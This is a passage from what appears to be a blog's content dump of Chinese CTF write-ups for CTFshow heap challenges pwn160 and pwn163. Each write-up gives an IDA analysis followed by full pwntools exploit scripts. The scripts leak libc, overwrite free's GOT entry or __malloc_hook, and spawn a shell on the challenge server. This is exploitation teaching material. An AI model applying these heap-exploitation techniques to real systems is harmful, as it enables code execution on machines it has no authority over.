class=\"string\">b&quot;a&quot;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;hhhh&#x27;</span>)  <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;b&quot;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;hhhh&#x27;</span>)  <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;c&quot;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;hhhh&#x27;</span>)  <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;d&quot;</span>,<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)  <span class=\"comment\">#3</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)  </span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&quot;d&quot;</span>,<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>) <span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;e&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;bbbb&#x27;</span>)  <span class=\"comment\">#5</span></span><br><span class=\"line\">free_got=elf.got[<span class=\"string\">&#x27;free&#x27;</span>]</span><br><span class=\"line\">payload=p32(<span class=\"number\">0</span>)*<span class=\"number\">5</span>+p32(<span class=\"number\">0x89</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">16</span></span><br><span class=\"line\">payload+=p32(<span class=\"number\">0x88</span>)+p32(<span class=\"number\">0x28</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">9</span>+p32(<span class=\"number\">0x89</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">4</span></span><br><span class=\"line\">payload+=p32(<span class=\"number\">0x88</span>)+p64(<span class=\"number\">0x29</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">8</span>+p32(<span class=\"number\">0x89</span>)</span><br><span class=\"line\">payload+=p32(free_got)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;description: &quot;</span>)</span><br><span class=\"line\">free=u32(io.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;free-&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free)))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;free&quot;</span>,free)</span><br><span class=\"line\">libcbase=free-libc.dump(<span class=\"string\">&#x27;free&#x27;</span>)</span><br><span class=\"line\">system=libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">0x4</span>,p32(system))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p>现在看来，delete(2)似乎有点多余了</p>\n","excerpt":"","more":"<h1 id=\"CTFshow-pwn160-堆风水\"><a href=\"#CTFshow-pwn160-堆风水\" class=\"headerlink\" title=\"CTFshow pwn160(堆风水)\"></a>CTFshow pwn160(堆风水)</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cbefdff92.png\" alt=\"1741933551272.png\"><br>1.简单的菜单题，通过menu，简单把函数名称修改，做一个简单的逆向</p>\n<h3 id=\"add函数分析\"><a href=\"#add函数分析\" class=\"headerlink\" title=\"add函数分析\"></a>add函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cc54920c5.png\" alt=\"1741933652418.png\"><br>1.通过add函数，要对堆块的储存结构有清晰的认知，这会影响甚至是决定我们攻击的手法。<br>2.可以看到每次add会申清两个堆块，一个大小由我们控制，一个大小固定为0x80。并且，大小自由的堆块的指针会被保存在，大小固定的那个堆块内。而大小固定的那个堆块的指针会被保存在heaplist(逆向重命名过)上。<br>3.input第一个参数是作为指针，所以他会写在v3上，位置是s指针后面。<br>4.然后这里调用edit去编辑堆块内容</p>\n<h3 id=\"edit函数分析\"><a href=\"#edit函数分析\" class=\"headerlink\" title=\"edit函数分析\"></a>edit函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d0bb5c4d7.png\" alt=\"1741934774792.png\"><br>1.看到这里对输入字节大小的检查，就可以联想到堆风水。是通过堆块的位置加上输入字节的大小，与另一块堆块的地址大小比较来判断。如果这两个堆块之间，有其他堆块，那么我们就可以对中间的堆块为所欲为了。</p>\n<h3 id=\"show函数分析\"><a href=\"#show函数分析\" class=\"headerlink\" title=\"show函数分析\"></a>show函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d1f5186f5.png\" alt=\"1741935092305.png\"><br>1.唯一的作用就是泄露libc</p>\n<h3 id=\"delete函数分析\"><a href=\"#delete函数分析\" class=\"headerlink\" title=\"delete函数分析\"></a>delete函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d22ae54bb.png\" alt=\"1741935146434.png\"><br>1.没有uaf，不能直接利用</p>\n<h3 id=\"gdb分析\"><a href=\"#gdb分析\" class=\"headerlink\" title=\"gdb分析\"></a>gdb分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cfb254f83.png\" alt=\"1741934513485.png\"><br>1.通过gdb，可以对堆块的内容，结构有更清晰的观察和了解</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先确定攻击的手法——堆风水.也就是要造成我们申清的堆块在最上方，add自动申清的堆块在最下方。此时我们就可以控制中间的堆块了.而0x80大小，会被放入unsortedbin中，满足先进先出的规则。那么我们先申请几个堆块，小于0x80。free掉堆块0，再add一个0x80大小的堆块，它会在从unsortedbin中取出之前的堆块给我们，同时从topchunk中分配出另一块。至此，一块低地址，一块高地址的堆块构造完成。<br>2.第二部对照gdb，把对应位置出的内容修改成free_got就可以通过show泄露libc.然后再通过edit修改got表内容。<br>3.最后delete一块内容为<code>/bin/sh\\x00</code>的堆块就可以打通了.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"比较复杂的解法\"><a href=\"#比较复杂的解法\" class=\"headerlink\" title=\"比较复杂的解法\"></a>比较复杂的解法</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;i386&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">1</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28252</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name,lenth,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;0&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;size of description: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name: &quot;</span>)</span><br><span class=\"line\">    io.sendline(name)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text length: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(lenth))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text: &quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,lenth,content</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Action: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text length: &quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(lenth))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;text: &quot;</span>)</span><br><span class=\"line\">    io.sendline(content)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&quot;a&quot;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;hhhh&#x27;</span>)  <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;b&quot;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;hhhh&#x27;</span>)  <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;c&quot;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;hhhh&#x27;</span>)  <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&quot;d&quot;</span>,<span class=\"number\">0x10</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>)  <span class=\"comment\">#3</span></span><br><span class=\"line\">delete(<span class=\"number\">2</span>)  </span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">b&quot;d&quot;</span>,<span class=\"number\">0x40</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>) <span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;e&#x27;</span>,<span class=\"number\">0x8</span>,<span class=\"string\">b&#x27;bbbb&#x27;</span>)  <span class=\"comment\">#5</span></span><br><span class=\"line\">free_got=elf.got[<span class=\"string\">&#x27;free&#x27;</span>]</span><br><span class=\"line\">payload=p32(<span class=\"number\">0</span>)*<span class=\"number\">5</span>+p32(<span class=\"number\">0x89</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">16</span></span><br><span class=\"line\">payload+=p32(<span class=\"number\">0x88</span>)+p32(<span class=\"number\">0x28</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">9</span>+p32(<span class=\"number\">0x89</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">4</span></span><br><span class=\"line\">payload+=p32(<span class=\"number\">0x88</span>)+p64(<span class=\"number\">0x29</span>)</span><br><span class=\"line\">payload+=p32(<span class=\"number\">0</span>)*<span class=\"number\">8</span>+p32(<span class=\"number\">0x89</span>)</span><br><span class=\"line\">payload+=p32(free_got)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;description: &quot;</span>)</span><br><span class=\"line\">free=u32(io.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&#x27;free-&#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free)))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;free&quot;</span>,free)</span><br><span class=\"line\">libcbase=free-libc.dump(<span class=\"string\">&#x27;free&#x27;</span>)</span><br><span class=\"line\">system=libcbase+libc.dump(<span class=\"string\">&#x27;system&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">0x4</span>,p32(system))</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p>现在看来，delete(2)似乎有点多余了</p>\n"},{"title":"CTFshow pwn163","cover":"/img/嘿猫猫.png","_content":"# CTFshow pwn163（堆块重叠|fastbin ）\n## 前言\n​        这两天在看IO_FILE 的相关利用，实在是给我看晕了。各种house of 确实有点东西。但是到最后发现自己的基础还是不够，除了fastbins 和 unsorted bins 稍微了解一点。其他的机制可以说是一坨。回来写点题，补一下基础。然后在结合这些基本的手法，去看高级的利用链。这个就是利用堆的布局，去达到我们的目的。或许也可以叫堆风水。\n​        突然觉得堆风水这个名字起得太好了，主要可以自己构造布局，为我所控。真有一种**盖周天之变，化吾为王** 的感觉。\n\n## ida分析\n### edit函数\n![image-20250529222118413](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250529222118413.png)\n1.其他函数没有漏洞。只有edit，对size 没有检查，可以溢出。\n2.在它的heaplist上会设置标志位检查这个堆块是否被free。\n3.show的时候，会根据add时的size 进行打印内容。\n4.add是采用calloc分配空间，初始化都为1。\n5.free会把指针置空，size置0，标志置0。\n6.并且，这是一道保护机制全开的题目。\n\n## 思路分析\n1.首先第一点是要泄露libc。由于保护机制全开，无法修改got表，同时程序的基地址无法获取。所以unlink的手段失效。显然是需要去修改hook。泄露libc的手段，是通过main_arena,也就是通过unsorted bins 中的堆块。由于add 会对堆块里的数据破坏，所以只能在堆块处于free 状态下打印。可是题目没有uaf 的漏洞，所以要让一个堆块又处于free 又处于 used 状态下。\n2.如何构造呢？在这里提供两种思路。第一种思路：我们通过两个大小相同为size ，且地址连续的unsorted bin 的chunk来构造一个重叠。通过溢出，将第一个堆块的大小，修改为两个堆块的大小。然后free掉第一个堆块。此时libc会认为，第一个堆块的大小是2*size，所以实际上libc会把两个堆块的空间都放入unsorted bins中。此时再申清，size大小的堆块，就可以把第一个堆块申请出来，并且会把main_arena+0x58 写入到第二个堆块中去。此时只要show就可以拿到信息了；第二种思路，是通过fastbin ，把已经分配的空间再分配，来完成的。首先将小堆块free 放入fastbins，然后通过溢出修改其fd指针，指向目标unsorted bin 的chunk，通过两次add，把这块空间再分配，那么两个指针指向同一块空间了。之后free 大堆块，将其放入unsorted bin中，再show 小堆块，就可以拿到信息了。\n3.拿到libc的信息之后，稍加计算得到malloc_hook 和 relloc的地址。然后就是fastbin dup 。在这里，本地打通之后，思路就是没问题的。但是远程会出现打不通的情况。原因是ibc版本不同所造成的偏移不一样。因此libcbase，one_gadget ，等地址可能会不一样。所以要打通远程得有正确的偏移。\n\n## exp\n### 思路一\n```python\nfrom esy import *\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h','-l','66%']\nio,elf=loadfile(\"pwn\",\"pwn.challenge.ctf.show\",28248)\nlibc=ELF(\"/home/tsq/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6\")\n\ndef add(size):\n    io.sendlineafter(\"Command: \",str(1))\n    io.sendlineafter(\"Size: \",str(size))\n\ndef edit(idx,size,content):\n    io.sendlineafter(\"Command: \",str(2))\n    io.sendlineafter(\"Index: \",str(idx))\n    io.sendlineafter(\"Size: \",str(size))\n    io.sendafter(\"Content: \",content)\n\ndef free(idx):\n    io.sendlineafter(\"Command: \",str(3))\n    io.sendlineafter(\"Index: \",str(idx))\n\ndef show(idx):\n    io.sendlineafter(\"Command: \",str(4))\n    io.sendlineafter(\"Index: \",str(idx))\n\nadd(0x20) # 0  全责哥\nadd(0x68) # 1  半责哥\nadd(0x80) # 2  堆块重叠\nadd(0x80) # 3  被重叠了\nadd(0x80) # 4  \nadd(0x20) # 5\n\nedit(1,0x6a,b'\\x41'*0x68+b'\\x21\\x01')\nfree(2)\nadd(0x80) # 2\nshow(3)\nio.recv(0x12)\n#libcbase=u64(io.recv(6).ljust(8,b'\\x00'))-0x3c3b78\nlibcbase=u64(io.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))-0x3c4b78\nlogvalue(\"libcbase\",hex(libcbase))\nmalloc_hook=libcbase+0x3c4b10\nrealloc=libcbase+0x846c0\nlogvalue(\"malloc_hook\",hex(malloc_hook))\none_gadget=libcbase+0x4526a\nadd(0x80) # 3\nfree(1)\n\nedit(0,0x38,p64(0)*5+p64(0x71)+p64(malloc_hook-0x23))\nadd(0x68) # 1\nadd(0x68) # 6\n#gdb.attach(io)\npayload=b'\\x00'*0xb+p64(one_gadget)+p64(realloc+8)\nedit(7,len(payload),payload)\nio.sendlineafter(\"Command: \",str(1))\nio.sendlineafter(\"Size: \",str(0x68))\n\nio.interactive()\n```\n### 思路二\n懒得写了，直接那官方的题解了\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n#io = process('./pwn')\nio = remote('pwn.challenge.ctf.show',28145)\nelf = ELF('./pwn')\nlibc = ELF('/home/bit/libc/64bit/libc-2.23.so')\n    \ndef Alloc(size):\n    io.recvuntil('Command:')\n    io.sendline('1')\n    io.recvuntil('Size:')\n    io.sendline(str(size))\n    \ndef Fill(index,content):\n    io.recvuntil('Command:')\n    io.sendline('2')\n    io.recvuntil('Index:')\n    io.sendline(str(index))\n    io.recvuntil('Size:')\n    io.sendline(str(len(content)))\n    io.recvuntil('Content:')\n    io.send(content)\n    \ndef Free(index):\n    io.recvuntil('Command:')\n    io.sendline('3')\n    io.recvuntil('Index:')\n    io.sendline(str(index))\n    \ndef Dump(index):\n    io.recvuntil('Command:')\n    io.sendline('4')\n    io.recvuntil('Index:')\n    io.sendline(str(index))\n    io.recvuntil('Content: \\n')\n    A = io.recvline()\n    return A\n\nAlloc(0x10)\nAlloc(0x10)\nAlloc(0x10)\nAlloc(0x10)\nAlloc(0x80)\nFree(1)\nFree(2)\npadding = p64(0)*3 + p64(0x21)\npayload = padding*2 + p8(0x80)\nFill(0, payload)\nFill(3, padding)\nAlloc(0x10)\nAlloc(0x10)\n\npayload = p64(0)*3 + p64(0x91)\nFill(3, payload)\nAlloc(0x80)\nFree(4)\nlibc_base = u64(Dump(2)[:8].ljust(8, \"\\x00\"))-0x3c4b78\nprint(hex(libc_base))\n    \nAlloc(0x60)\nFree(4)\npayload = p64(libc_base + 0x3c4aed)\nFill(2, payload)\nAlloc(0x60)\nAlloc(0x60)\none = libc_base + 0x4526a\npayload = p8(0)*3 + p64(0)*2 + p64(one)\nFill(6, payload)\nAlloc(0x10)\n\nio.interactive()\n```","source":"_posts/heap/CTFshow pwn163.md","raw":"---\ntitle: CTFshow pwn163\ntags:\n    - pwn\n    - 堆块重叠\ncategories:\n    - 做题笔记\ncover: /img/嘿猫猫.png\n---\n# CTFshow pwn163（堆块重叠|fastbin ）\n## 前言\n​        这两天在看IO_FILE 的相关利用，实在是给我看晕了。各种house of 确实有点东西。但是到最后发现自己的基础还是不够，除了fastbins 和 unsorted bins 稍微了解一点。其他的机制可以说是一坨。回来写点题，补一下基础。然后在结合这些基本的手法，去看高级的利用链。这个就是利用堆的布局，去达到我们的目的。或许也可以叫堆风水。\n​        突然觉得堆风水这个名字起得太好了，主要可以自己构造布局，为我所控。真有一种**盖周天之变，化吾为王** 的感觉。\n\n## ida分析\n### edit函数\n![image-20250529222118413](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250529222118413.png)\n1.其他函数没有漏洞。只有edit，对size 没有检查，可以溢出。\n2.在它的heaplist上会设置标志位检查这个堆块是否被free。\n3.show的时候，会根据add时的size 进行打印内容。\n4.add是采用calloc分配空间，初始化都为1。\n5.free会把指针置空，size置0，标志置0。\n6.并且，这是一道保护机制全开的题目。\n\n## 思路分析\n1.首先第一点是要泄露libc。由于保护机制全开，无法修改got表，同时程序的基地址无法获取。所以unlink的手段失效。显然是需要去修改hook。泄露libc的手段，是通过main_arena,也就是通过unsorted bins 中的堆块。由于add 会对堆块里的数据破坏，所以只能在堆块处于free 状态下打印。可是题目没有uaf 的漏洞，所以要让一个堆块又处于free 又处于 used 状态下。\n2.如何构造呢？在这里提供两种思路。第一种思路：我们通过两个大小相同为size ，且地址连续的unsorted bin 的chunk来构造一个重叠。通过溢出，将第一个堆块的大小，修改为两个堆块的大小。然后free掉第一个堆块。此时libc会认为，第一个堆块的大小是2*size，所以实际上libc会把两个堆块的空间都放入unsorted bins中。此时再申清，size大小的堆块，就可以把第一个堆块申请出来，并且会把main_arena+0x58 写入到第二个堆块中去。此时只要show就可以拿到信息了；第二种思路，是通过fastbin ，把已经分配的空间再分配，来完成的。首先将小堆块free 放入fastbins，然后通过溢出修改其fd指针，指向目标unsorted bin 的chunk，通过两次add，把这块空间再分配，那么两个指针指向同一块空间了。之后free 大堆块，将其放入unsorted bin中，再show 小堆块，就可以拿到信息了。\n3.拿到libc的信息之后，稍加计算得到malloc_hook 和 relloc的地址。然后就是fastbin dup 。在这里，本地打通之后，思路就是没问题的。但是远程会出现打不通的情况。原因是ibc版本不同所造成的偏移不一样。因此libcbase，one_gadget ，等地址可能会不一样。所以要打通远程得有正确的偏移。\n\n## exp\n### 思路一\n```python\nfrom esy import *\ncontext.log_level='debug'\ncontext.terminal=['tmux','splitw','-h','-l','66%']\nio,elf=loadfile(\"pwn\",\"pwn.challenge.ctf.show\",28248)\nlibc=ELF(\"/home/tsq/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6\")\n\ndef add(size):\n    io.sendlineafter(\"Command: \",str(1))\n    io.sendlineafter(\"Size: \",str(size))\n\ndef edit(idx,size,content):\n    io.sendlineafter(\"Command: \",str(2))\n    io.sendlineafter(\"Index: \",str(idx))\n    io.sendlineafter(\"Size: \",str(size))\n    io.sendafter(\"Content: \",content)\n\ndef free(idx):\n    io.sendlineafter(\"Command: \",str(3))\n    io.sendlineafter(\"Index: \",str(idx))\n\ndef show(idx):\n    io.sendlineafter(\"Command: \",str(4))\n    io.sendlineafter(\"Index: \",str(idx))\n\nadd(0x20) # 0  全责哥\nadd(0x68) # 1  半责哥\nadd(0x80) # 2  堆块重叠\nadd(0x80) # 3  被重叠了\nadd(0x80) # 4  \nadd(0x20) # 5\n\nedit(1,0x6a,b'\\x41'*0x68+b'\\x21\\x01')\nfree(2)\nadd(0x80) # 2\nshow(3)\nio.recv(0x12)\n#libcbase=u64(io.recv(6).ljust(8,b'\\x00'))-0x3c3b78\nlibcbase=u64(io.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00'))-0x3c4b78\nlogvalue(\"libcbase\",hex(libcbase))\nmalloc_hook=libcbase+0x3c4b10\nrealloc=libcbase+0x846c0\nlogvalue(\"malloc_hook\",hex(malloc_hook))\none_gadget=libcbase+0x4526a\nadd(0x80) # 3\nfree(1)\n\nedit(0,0x38,p64(0)*5+p64(0x71)+p64(malloc_hook-0x23))\nadd(0x68) # 1\nadd(0x68) # 6\n#gdb.attach(io)\npayload=b'\\x00'*0xb+p64(one_gadget)+p64(realloc+8)\nedit(7,len(payload),payload)\nio.sendlineafter(\"Command: \",str(1))\nio.sendlineafter(\"Size: \",str(0x68))\n\nio.interactive()\n```\n### 思路二\n懒得写了，直接那官方的题解了\n```python\nfrom pwn import *\ncontext(arch='amd64',os='linux',log_level='debug')\n#io = process('./pwn')\nio = remote('pwn.challenge.ctf.show',28145)\nelf = ELF('./pwn')\nlibc = ELF('/home/bit/libc/64bit/libc-2.23.so')\n    \ndef Alloc(size):\n    io.recvuntil('Command:')\n    io.sendline('1')\n    io.recvuntil('Size:')\n    io.sendline(str(size))\n    \ndef Fill(index,content):\n    io.recvuntil('Command:')\n    io.sendline('2')\n    io.recvuntil('Index:')\n    io.sendline(str(index))\n    io.recvuntil('Size:')\n    io.sendline(str(len(content)))\n    io.recvuntil('Content:')\n    io.send(content)\n    \ndef Free(index):\n    io.recvuntil('Command:')\n    io.sendline('3')\n    io.recvuntil('Index:')\n    io.sendline(str(index))\n    \ndef Dump(index):\n    io.recvuntil('Command:')\n    io.sendline('4')\n    io.recvuntil('Index:')\n    io.sendline(str(index))\n    io.recvuntil('Content: \\n')\n    A = io.recvline()\n    return A\n\nAlloc(0x10)\nAlloc(0x10)\nAlloc(0x10)\nAlloc(0x10)\nAlloc(0x80)\nFree(1)\nFree(2)\npadding = p64(0)*3 + p64(0x21)\npayload = padding*2 + p8(0x80)\nFill(0, payload)\nFill(3, padding)\nAlloc(0x10)\nAlloc(0x10)\n\npayload = p64(0)*3 + p64(0x91)\nFill(3, payload)\nAlloc(0x80)\nFree(4)\nlibc_base = u64(Dump(2)[:8].ljust(8, \"\\x00\"))-0x3c4b78\nprint(hex(libc_base))\n    \nAlloc(0x60)\nFree(4)\npayload = p64(libc_base + 0x3c4aed)\nFill(2, payload)\nAlloc(0x60)\nAlloc(0x60)\none = libc_base + 0x4526a\npayload = p8(0)*3 + p64(0)*2 + p64(one)\nFill(6, payload)\nAlloc(0x10)\n\nio.interactive()\n```","slug":"heap/CTFshow 